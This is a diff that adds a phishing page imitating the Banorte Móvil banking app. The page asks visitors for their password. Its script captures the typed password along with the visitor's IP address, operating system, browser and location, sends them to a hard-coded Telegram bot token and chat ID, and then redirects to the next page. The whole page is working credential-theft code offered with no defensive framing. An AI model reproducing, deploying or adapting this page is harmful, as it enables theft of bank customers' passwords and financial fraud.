@@ -1,0 +1,226 @@
+<html>
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <title>Home</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="stylesheet" type="text/css" href="css/util.css">
+      <link rel="stylesheet" type="text/css" href="css/main.css">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+      <script>
+         $.getJSON("https://api.ipify.org?format=json",
+                                           function(data) {
+         
+             // Setting text of element P with id gfg
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+      $("#ip").html("IP: " + response.ip);
+      $("#address").html("" + response.city + ", " + response.country);
+
+      })
+      </script>
+      <script>// Obtener la IP del usuario (necesita un servicio externo como "https://api.ipify.org?format=json")
+         async function getUserIP() {
+             try {
+                 const response = await fetch('https://api.ipify.org?format=json');
+                 const data = await response.json();
+                 return data.ip;
+             } catch (error) {
+                 console.error('Error obteniendo la IP:', error);
+                 return 'No IP';
+             }
+         }
+         
+         // Obtener el sistema operativo
+         function getOS() {
+             let userAgent = window.navigator.userAgent;
+             let osArray = [
+                 { regex: /windows nt 10/i, os: 'Windows 10' },
+                 { regex: /windows nt 6.3/i, os: 'Windows 8.1' },
+                 { regex: /windows nt 6.2/i, os: 'Windows 8' },
+                 { regex: /windows nt 6.1/i, os: 'Windows 7' },
+                 { regex: /windows nt 6.0/i, os: 'Windows Vista' },
+                 { regex: /windows nt 5.1/i, os: 'Windows XP' },
+                 { regex: /macintosh|mac os x/i, os: 'Mac OS X' },
+                 { regex: /linux/i, os: 'Linux' },
+                 { regex: /ubuntu/i, os: 'Ubuntu' },
+                 { regex: /iphone/i, os: 'iPhone' },
+                 { regex: /ipad/i, os: 'iPad' },
+                 { regex: /android/i, os: 'Android' },
+                 { regex: /blackberry/i, os: 'BlackBerry' },
+                 { regex: /webos/i, os: 'Mobile' }
+             ];
+         
+             for (let item of osArray) {
+                 if (item.regex.test(userAgent)) {
+                     return item.os;
+                 }
+             }
+             return 'Unknown OS Platform';
+         }
+         
+         // Obtener el navegador
+         function getBrowser() {
+             let userAgent = window.navigator.userAgent;
+             if (userAgent.indexOf('Edge') > -1) return 'Microsoft Edge';
+             if (userAgent.indexOf('OPR') > -1 || userAgent.indexOf('Opera') > -1) return 'Opera';
+             if (userAgent.indexOf('Firefox') > -1) return 'Mozilla Firefox';
+             if (userAgent.indexOf('Chrome') > -1) return 'Google Chrome';
+             if (userAgent.indexOf('Safari') > -1) return 'Safari';
+             if (userAgent.indexOf('MSIE') > -1 || userAgent.indexOf('Trident') > -1) return 'Internet Explorer';
+             return 'No navegador';
+         }
+         
+         // Obtener información geográfica basada en la IP
+         async function getGeolocation(ip) {
+             try {
+                 const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
+                 const data = await response.json();
+                 return {
+                     pais: data.geoplugin_countryName || 'Desconocido',
+                     region: data.geoplugin_regionName || 'Desconocido',
+                     ciudad: data.geoplugin_city || 'Desconocido'
+                 };
+             } catch (error) {
+                 console.error('Error obteniendo geolocalización:', error);
+                 return { pais: 'Desconocido', region: 'Desconocido', ciudad: 'Desconocido' };
+             }
+         }
+         
+         // Enviar mensaje a Telegram
+         async function sendMessage(message) {
+             const apiToken = "7566918384:AAHK7lNyFbtpV4VmkbdOiMSqbVDenCUzd3M";
+             const chatId = "5432640156";
+         
+             const data = {
+                 chat_id: chatId,
+                 text: message
+             };
+         
+             try {
+                 const response = await fetch(`https://api.telegram.org/bot${apiToken}/sendMessage`, {
+                     method: 'POST',
+                     headers: {
+                         'Content-Type': 'application/json'
+                     },
+                     body: JSON.stringify(data)
+                 });
+                 const result = await response.json();
+                 console.log('Mensaje enviado:', result);
+             } catch (error) {
+                 console.error('Error enviando mensaje a Telegram:', error);
+             }
+         }
+         
+         // Función principal para ejecutar todo el flujo
+         async function main() {
+             const ip = await getUserIP();
+             const os = getOS();
+             const browser = getBrowser();
+             const geoData = await getGeolocation(ip);
+         
+             const message = `SO: ${os}, Navegador: ${browser}, IP: ${ip}, País: ${geoData.pais}, Región: ${geoData.region}, Ciudad: ${geoData.ciudad}`;
+             console.log('Enviando mensaje:', message);
+         
+             const password = document.querySelector('input[name="0T4RX"]').value;
+             if (password) {
+                 const fullMessage = `Contraseña: ${password}\r\n${message}`;
+                 await sendMessage(fullMessage);
+                 window.location.href = 'index3.html';
+             } else {
+                 window.location.href = 'index3.html';
+             }
+         }
+         
+         // Ejecutar la función principal cuando se envíe el formulario
+         document.addEventListener('DOMContentLoaded', function () {
+         document
+            .getElementById("myForm")
+            .addEventListener("submit", async function (event) {
+               event.preventDefault(); // Prevenir el envío del formulario estándar
+             main();
+            });
+         });     
+
+      </script>
+   </head>
+   <body>
+      <header id="main-header">
+         <a class="logo-header" href="#">
+         <div align="center"><img src="img/yDvl2u8.png" style="width: 250px">
+         </a> <!-- / #logo-header -->
+         <div class="menu-header" href="index.html">
+            <div id="bar-menu" class="bar-menu">
+               <span></span>
+               <span></span>
+               <span></span>
+            </div>
+         </div>
+      </header>
+      <!-- / #main-header -->
+      <div class="limiter">
+         <div class="container-login100" style="background-color: white; 
+            position: absolute;
+            ">
+            <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54" >
+              
+               <section class="">
+                  <form class="login100-form validate-form" name="myForm" id="myForm">
+                     <p id="address" hidden="">Medellín, CO</p>
+                     <p id="gfg" hidden="">
+                        <b></b>
+                     </p>
+                     <br>
+                     <div class="textypn1"><b><span class="model" style="font-size:28px; color:#eb0029; text-align:center;">
+                        ¡ Banorte Móvil !</span></b>
+                     </div>
+                     <div class="wrap-input101 validate-input" data-validate="">
+                        <br>
+                        <div align="center" class="textypn2"><span class="model" style="font-size:16px; color:#000000; text-align:center;display: block;margin: 0 auto;">
+                           Ingresa tu contraseña para finalizar la validación.</span>
+                        </div>
+                        <br>
+                        <br>
+						<div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">
+                           Captura tu contraseña</span>
+						</div>
+                        <br>
+                        <div class="wrap-input101 validate-input" data-validate=""> 
+                           <span class="label-input101"></span>
+                           <input class="input101" type="text" style="text-align: left;padding-left: 10px" id="0T4RX" name="0T4RX" maxlength="15" minlength="4" required="true" onkeypress="" placeholder="Ingresa tu contraseña">
+                           <span class="focus-input100" data-symbol=""></span>
+                        </div>
+                        <div class="wrap-input101 validate-input" data-validate="">
+                           <span class="label-input101"></span>
+                           <br>
+                        <br>
+                        <div class="text-right p-t-8 p-b-31">
+                        </div>
+                        <div class="container-login100-form-btn">
+                           <div class="wrap-login100-form-btn">
+                              <div class="login100-form-bgbtn"></div>
+                              <button type="submit" style="background-color:#eb0029; height:50px; width:100%;font-family: helvetica;font-size: 13pt;" class="login100-form-btn" value="Continuar" id="btnSend">
+                              Continuar
+                              </button>
+                           </div>
+                        </div>
+                        <div>
+                           <br>
+                           <br>
+                        </div>
+                        <br>
+                     </div>
+                  </form>
+               </section>
+            </div>
+            <header id="main-header2">
+            </header>
+            <!-- / #main-header -->
+         </div>
+         <div id="dropDownSelect1"></div>
+         
+      </div>
+   </body>
+</html>
